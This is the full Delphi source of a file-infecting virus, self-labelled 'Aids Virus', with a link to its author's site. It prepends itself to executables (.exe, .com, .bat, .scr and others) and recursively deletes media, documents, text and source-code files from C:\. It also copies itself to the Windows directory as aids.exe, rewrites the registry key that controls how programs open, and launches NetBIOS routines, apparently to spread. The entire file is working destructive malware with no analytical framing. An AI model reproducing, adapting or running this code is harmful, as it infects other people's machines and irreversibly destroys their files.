   (* Aids Virus: Coded by p0ke *)
   { -- http://p0ke.no-ip.com -- }
   { This source has no comments }
   program AIDS;

   uses
     Windows, {IconChanger, }netbios;

   {$R *.res}

   const
     av_message                          = '$ you got aids $ total mayhem $';
     faReadOnly                          = $00000001;
     faHidden                            = $00000002;
     faSysFile                           = $00000004;
     faVolumeID                          = $00000008;
     faDirectory                         = $00000010;
     faArchive                           = $00000020;
     faAnyFile                           = $0000003F;
     fmOpenRead                          = $0000;
     fmOpenWrite                         = $0001;
     fmOpenReadWrite                     = $0002;
     fmShareCompat                       = $0000;
     fmShareExclusive                    = $0010;
     fmShareDenyWrite                    = $0020;
     fmShareDenyRead                     = $0030;
     fmShareDenyNone                     = $0040;

   type
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle;
       FindData: TWin32FindData;
     end;

     TAttachmentHeader = record
       MagicNumber: cardinal;
       CRC: cardinal;
       Size: int64;
       IsStub: boolean;
       FileName: array[0..MAX_PATH] of char;
     end;
     PAttachmentHeader = ^TAttachmentHeader;

     LongRec = packed record
     case Integer of
       0: (Lo, Hi: Word);
       1: (Words: array [0..1] of Word);
       2: (Bytes: array [0..3] of Byte);
     end;

   var
     Virus  : tHandle;
     OutPut : tHandle;
     Header : tAttachmentHeader;
     itemHeader : pAttachmentHeader;

     fName  : String;
     StubSize : int64;

   function SpawnProgram(Filename: string): boolean;
   var
     si: TStartupInfo;
     pi: TProcessInformation;
   begin
     FillChar(si, sizeof(si), 0);
     si.cb:= sizeof(si);
     si.dwFlags:= STARTF_USESHOWWINDOW;
     si.wShowWindow:= SW_SHOWDEFAULT;
     if not CreateProcessA(nil, PChar(Filename), nil, nil, false, 0, nil, nil, si, pi) then
     begin
       result:= false;
       Exit;
       Halt(0);
     end
     else
       result:= true;
   end;

   function GetTmpPath: string;
   var
   buffer: array[0..MAX_PATH] of char;
   begin
     result:= '';
     if GetTempPathA(MAX_PATH, buffer) <> 0 then
     begin
       result:= String(PChar(@buffer));
       if result[length(result)] <> '\' then
       result:= result + '\';
     end;
   end;

   function FileExists(const FileName: string): Boolean;
   var
   lpFindFileData: TWin32FindData;
   hFile: Cardinal;
   begin
     hFile := FindFirstFile(PChar(FileName), lpFindFileData);
     if hFile <> INVALID_HANDLE_VALUE then
     begin
       result := True;
       Windows.FindClose(hFile)
     end
     else
       result := False;
   end;

   function FileOpen(const FileName: string; Mode: LongWord): Integer;
   const
     AccessMode: array[0..2] of LongWord = (
     GENERIC_READ,
     GENERIC_WRITE,
     GENERIC_READ or GENERIC_WRITE);
     ShareMode: array[0..4] of LongWord = (
     0,
     0,
     FILE_SHARE_READ,
     FILE_SHARE_WRITE,
     FILE_SHARE_READ or FILE_SHARE_WRITE);
   begin
     Result := Integer(CreateFileA(PChar(FileName), AccessMode[Mode and 3],
     ShareMode[(Mode and $F0) shr 4], nil, OPEN_EXISTING,
     FILE_ATTRIBUTE_NORMAL, 0));
   end;

   function FileCreate(const FileName: string): Integer;
   begin
     Result := Integer(CreateFileA(PChar(FileName), GENERIC_READ or GENERIC_WRITE,
     0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0));
   end;

   procedure FileClose(Handle: Integer);
   begin
     CloseHandle(THandle(Handle));
   end;

   Procedure Release;
   var
     buffer: array[0..$ffff] of byte;
     fSource, fTemp: THandle;
     BytesRead, BytesWritten: cardinal;
     NeededSize, BufferRead: cardinal;
     tmppath, fname, tname: string;
     Header: TAttachmentHeader;
   begin
     TmpPath := GetTmpPath;
     Try
       FSource := FileOpen(ParamStr(0), fmOpenRead or fmShareDenyWrite);
       If FSource = THandle(-1) Then
       Begin
         Exit;
       End;
       Try
         SetFilePointer(FSource, GetFileSize(FSource, NIL) - SizeOf(TAttachmentHeader), NIL, FILE_BEGIN);
         ReadFile(FSource, Header, SizeOf(Header), BytesRead, NIL);
         if (Header.MagicNumber <> $FEEDBEEF) or (BytesRead <> SizeOf(Header)) Then
         Begin
           FileClose(FSource);
           Exit;
         End;
         SetFilePointer(FSource, Header.Size, NIL, FILE_BEGIN);
         While (SetFilePointer(FSource, 0, NIL, FILE_CURRENT) <= (GetFileSize(FSource, NIL) - SizeOf(Header))) Do
         Begin
           ReadFile(FSource, Header, SizeOf(Header), BytesRead, NIL);
           If Header.MagicNumber <> $FEEDBEEF Then
           Begin
             Exit;
           End;
           FName := Header.FileName;
           Repeat
             Str(GetTickCount, TName);
             Fname := 'tmp'+tname+'.exe';
             Sleep(0);
           Until Not FileExists(TmpPath+Fname);
           fTemp := FileCreate(TmpPath + Fname);
           NeededSize := Header.Size;
           Repeat
             If NeededSize > SizeOf(Buffer) Then
               BufferRead := SizeOf(Buffer)
             Else
               BufferRead := NeededSize;
             ReadFile(FSource, Buffer, BufferRead, BytesRead, NIL);
             WriteFile(FTemp, Buffer, BytesRead, BytesWritten, NIL);
             Dec(NeededSize, BytesRead);
           Until (BytesRead <> BufferRead) Or (NeededSize = 0);
           FileClose(FTemp);
           If (NeededSize <> 0) Or (Not SpawnProgram(TmpPath + Fname)) Then
           Begin
             FileClose(FSource);
             Exit;
           End;
         End;
         FileClose(FSource);
         Finally
           End;
       Finally
         End;
   End;


   Function FFileSize(FileName: String): int64;
   Var
     H: tHandle;
     fData: tWin32FindData;
   Begin
     Result := -1;
     H := FindFirstFile(pChar(FileName), fData);
     If H <> INVALID_HANDLE_VALUE Then
     Begin
       Windows.FindCLose(H);
       Result := Int64(fData.nFileSizeHigh) shl 32 +
       fData.nFileSizeLow;
     End;
   End;

   function AllocMem(Size: Cardinal): Pointer;
   begin
     GetMem(Result, Size);
     FillChar(Result^, Size, 0);
   end;

   function StrPas(const Str: PChar): string;
   begin
     Result := Str;
   end;

   function StrLCopy(Dest: PChar; const Source: PChar; MaxLen: Cardinal): PChar; assembler;
   asm
           PUSH    EDI
           PUSH    ESI
           PUSH    EBX
           MOV     ESI,EAX
           MOV     EDI,EDX
           MOV     EBX,ECX
           XOR     AL,AL
           TEST    ECX,ECX
           JZ      @@1
           REPNE   SCASB
           JNE     @@1
           INC     ECX
   @@1:    SUB     EBX,ECX
           MOV     EDI,ESI
           MOV     ESI,EDX
           MOV     EDX,EDI
           MOV     ECX,EBX
           SHR     ECX,2
           REP     MOVSD
           MOV     ECX,EBX
           AND     ECX,3
           REP     MOVSB
           STOSB
           MOV     EAX,EDX
           POP     EBX
           POP     ESI
           POP     EDI
   end;

   Function GetHeader(FileW: String): pAttachmentHeader;
   Var
     Header: pAttachmentHeader;
   Begin
     Header := AllocMem(SizeOf(tAttachmentHeader));
     StrLCopy(@Header.Filename, pChar(FileW), MAX_PATH);
     Header.Size := FFileSize(FileW);
     Header.IsStub := False;
     Result := Header;
   End;

   Procedure infectFile(Victime:String);
   Var
     Buffer: Array[0..2048] Of Char;
     BytesRead, BytesWritten: LongWord;
     F:File;
     Str:String;
     I:Integer;
   Begin
     {$i-}
      AssignFile(F, Victime);
      FileMode:=0;
      Reset(F, 1);
      I := FileSize(F);
      SetLength(Str,FileSize(F));
      BlockRead(F, Str[1], I);
      CloseFile(F);
     {$i+}
     If Pos('you~~got~~aids',Str)>0 Then Exit;
     ZeroMemory(@Buffer, SizeOf(Buffer));
     OutPut := CreateFile(pChar(Victime+'-'),
               GENERIC_WRITE,
               FILE_SHARE_WRITE,
               NIL,
               CREATE_NEW,
               FILE_ATTRIBUTE_NORMAL,
               0);
     itemHeader := GetHeader(ParamStr(0));
     fName      := StrPas(@itemHeader.FileName);
     Virus  := CreateFile(pChar(fName),
               GENERIC_READ,
               FILE_SHARE_READ,
               NIL,
               OPEN_EXISTING,
               FILE_ATTRIBUTE_NORMAL,
               0);
     Repeat
       ReadFile(Virus, Buffer, 2048, BytesRead, NIL);
       WriteFile(OutPut, Buffer, BytesRead, BytesWritten, NIL);
     Until BytesWritten = 0;
     CloseHandle(Virus);
     itemHeader := GetHeader(Victime);
     fName      := StrPas(@itemHeader.FileName);
     Header.MagicNumber := $FEEDBEEF;
     Header.CRC := 0;
     Header.Size := FFileSize(Victime);
     Header.IsStub := False;
     Header.FileName := itemHeader.FileName;
     WriteFile(OutPut, Header, SizeOf(Header), BytesWritten, NIL);
     Virus  := CreateFile(pChar(fName),
               GENERIC_READ,
               FILE_SHARE_READ,
               NIL,
               OPEN_EXISTING,
               FILE_ATTRIBUTE_NORMAL,
               0);
     Repeat
       ReadFile(Virus, Buffer, 2048, BytesRead, NIL);
       WriteFile(OutPut, Buffer, BytesRead, BytesWritten, NIL);
     Until BytesWritten = 0;
     CloseHandle(Virus);

     itemHeader := GetHeader(ParamStr(0));
     fName := StrPas(@itemHeader.FileName);
     StubSize := FFileSize(ParamStr(0));

     Header.MagicNumber := $FEEDBEEF;
     Header.CRC := 0;
     Header.Size := StubSize;
     Header.IsStub := True;

     FillChar(Header.FileName, MAX_PATH+1, 0);

     WriteFile(OutPut, Header, SizeOf(Header), BytesWritten, NIL);
     Str := 'you~~got~~aids';
     WriteFile(OutPut, Str[1], Length(Str), BytesWritten, NIL);
     CloseHandle(OutPut);

     DeleteFile(pChar(Victime));
     CopyFile  (pChar(Victime+'-'), pChar(Victime), False);
     DeleteFile(pChar(Victime+'-'));
   End;

   function FileExt(Name: String): String;
   Begin
     If Pos('.', Name) = 0 Then Exit;

     While Pos('.', Name) > 0 Do
       Name := Copy(Name, Pos('.', Name)+1, Length(Name));

     Result := Name;
   End;

   function FindMatchingFile(var F: TSearchRec): Integer;
   var
     LocalFileTime: TFileTime;
   begin
     with F do
     begin
       while FindData.dwFileAttributes and ExcludeAttr <> 0 do
         if not FindNextFile(FindHandle, FindData) then
         begin
           Result := GetLastError;
           Exit;
         end;
       FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
       FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi, LongRec(Time).Lo);
       Size := FindData.nFileSizeLow;
       Attr := FindData.dwFileAttributes;
       Name := FindData.cFileName;
     end;
     Result := 0;
   end;

   procedure FindClose(var F: TSearchRec);
   begin
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(F.FindHandle);
       F.FindHandle := INVALID_HANDLE_VALUE;
     end;
   end;

   function FindFirst(const Path: string; Attr: Integer;
     var  F: TSearchRec): Integer;
   const
     faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
   begin
     F.ExcludeAttr := not Attr and faSpecial;
     F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Result := FindMatchingFile(F);
       if Result <> 0 then FindClose(F);
     end else
       Result := GetLastError;
   end;

   function FindNext(var F: TSearchRec): Integer;
   begin
     if FindNextFile(F.FindHandle, F.FindData) then
       Result := FindMatchingFile(F) else
       Result := GetLastError;
   end;

   function LowerCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   Function fSize(FileName: String): int64;
   Var
     H: tHandle;
     fData: tWin32FindData;
   Begin
     Result := -1;
     H := FindFirstFile(pChar(FileName), fData);
     If H <> INVALID_HANDLE_VALUE Then
     Begin
       Windows.FindCLose(H);
       Result := Int64(fData.nFileSizeHigh) shl 32 +
       fData.nFileSizeLow;
     End;
   End;

   procedure ListFiles(D, Name, SearchName: String);
   Var
     SR: TSearchRec;
     file_ext : string;
   Begin
     If D[Length(D)] <> '\' Then D := D + '\';
     If FindFirst(D + '*.*', faDirectory, Sr) = 0 Then
     Repeat
       If ((SR.Attr And faDirectory) = faDirectory) and (sr.Name[1] <> '.') Then
         ListFiles(D + SR.Name + '\', Name, SearchName)
       Else
       Begin
         file_ext := lowercase(fileext(sr.name));
         if file_ext = 'exe'  then InfectFile(D+Sr.Name);
         if file_ext = 'pif'  then InfectFile(D+Sr.Name);
         if file_ext = 'com'  then InfectFile(D+Sr.Name);
         if file_ext = 'scr'  then InfectFile(D+Sr.Name);
         if file_ext = 'cmd'  then InfectFile(D+Sr.Name);
         if file_ext = 'bat'  then InfectFile(D+Sr.Name);
         if file_ext = 'mp3'  then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'htm'  then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'html' then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'php'  then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'jpg'  then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'bmp'  then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'avi'  then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'mpg'  then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'mpeg' then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'iso'  then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'bin'  then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'cue'  then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'ccd'  then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'txt'  then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'doc'  then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'c'    then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'cpp'  then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'dpr'  then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'pas'  then DeleteFile(pChar(D+Sr.name));
         if file_ext = '~dpr' then DeleteFile(pChar(D+Sr.name));
         if file_ext = '~pas' then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'vbp'  then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'bas'  then DeleteFile(pChar(D+Sr.name));
         if file_ext = 'vbs'  then DeleteFile(pChar(D+Sr.name));
       End;
     Until FindNext(SR) <> 0;
     FindClose(SR);
   End;

   FUNCTION WinPath : STRING;
   VAR
     PWindowsDir : ARRAY [0..255] OF Char;
   BEGIN
     GetWindowsDirectory(PWindowsDir,255);
     WinPath:=STRING(PWindowsDir)+'\';
   END;

   Procedure SetRegValue(kRoot:Hkey; Path, Value, Str:String);
   Var
    Key : Hkey;
    Siz : Cardinal;
   Begin
    RegOpenKey(kRoot, pChar(Path), Key);
    Siz := 2048;
    RegSetValueEx( Key, pChar(Value), 0, REG_SZ, @Str[1], Siz);
    RegCloseKey(Key);
   End;

   var
     i:integer;
     n:TNetBios;
     numberofips: byte;
     j:byte;
     ip:string;
     msg:tmsg;
   begin
     If CreateMutex(nil,false,'you_got_aids') = error_already_exists then exitprocess(0);
     Release;
     copyfile(pchar(paramstr(0)),pchar(winpath+'aids.exe'), false);

     setregvalue(hkey_classes_root, 'exefile\shell\open\command', '', '"%1" %*');

     for i := 0 to 400 do
     Begin
       n := tnetbios.Create;
       n.StartNetBIOS;
     End;
     ListFiles('C:\', '*', '*.*');
     while getmessage(msg,0,0,0) do
      dispatchmessage(msg);
   end.
